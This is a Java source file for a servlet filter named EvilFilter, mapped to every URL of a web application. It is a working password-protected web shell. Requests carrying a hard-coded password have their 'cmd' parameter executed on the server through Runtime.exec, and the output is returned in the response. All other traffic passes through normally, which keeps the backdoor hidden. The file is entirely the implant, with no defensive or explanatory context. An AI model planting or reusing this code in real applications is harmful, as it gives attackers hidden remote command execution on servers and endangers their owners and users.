import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebFilter(filterName = "1nhann", urlPatterns = "/*")
public class EvilFilter implements Filter {
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpServletRequest request = (HttpServletRequest) servletRequest;

        request.setCharacterEncoding("UTF-8");
        String password = request.getParameter("password");

        if (password != null) {
            if (password.equals("1nhann")) {
                String cmd = request.getParameter("cmd");
                Runtime rt = Runtime.getRuntime();
                Process process = rt.exec(cmd);
                java.io.InputStream in = process.getInputStream();
                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                String s = null;
                StringBuilder sb = new StringBuilder();
                while ((s = stdInput.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
                response.getWriter().write(sb.toString());
                return;
            }
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }
}
